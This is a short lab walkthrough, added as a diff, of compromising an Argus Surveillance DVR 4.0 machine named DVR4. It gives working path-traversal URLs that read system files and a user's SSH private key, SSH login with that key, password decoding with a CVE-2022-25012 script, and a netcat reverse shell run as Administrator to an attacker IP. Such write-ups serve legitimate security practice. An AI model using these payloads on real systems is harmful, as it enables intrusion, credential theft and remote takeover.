@@ -1,0 +1,66 @@
+DVR4
+
+192.168.51.179
+
+nmap 192.168.51.179
+
+192.168.51.179:8080
+http://192.168.51.179:8080/Users.html
+Administrator
+Viewer
+
+http://192.168.51.179:8080/About.html
+ Argus Surveillance DVR Version: 4.0
+
+https://www.exploit-db.com/exploits/45296
+
+http://192.168.51.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
+
+after decoding 
+
+http://192.168.51.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=../../../../../../../../../../../../../../../../Windows/system.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
+
+try to disclose the SSH KEY
+as 22 is running on the machine
+
+http://192.168.51.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FAdministrator%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
+no luck 
+
+letstry for viewer user
+
+http://192.168.51.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
+
+Got key
+ssh -i id_rsa viewer@192.168.51.179
+error with key 
+
+not formatted properly
+
+cat id_rsa | tr " " "\n" >key   
+mousepad key
+chmod 700 key
+ssh -i key viewer@192.168.51.179
+
+
+got access
+
+https://www.exploit-db.com/exploits/50130
+https://github.com/s3l33/CVE-2022-25012/blob/main/CVE-2022-25012.py
+
+C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini
+where i can get the password
+
+python CVE-2022-25012.py ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8
+
+i found nc.exe inside 
+C:\Users\viewer 
+that supper for me
+
+runas /user:Administrator "nc.exe -e cmd.exe 192.168.49.51 4444"
+
+start listener 
+got shell
+
+
+
+Yes its working
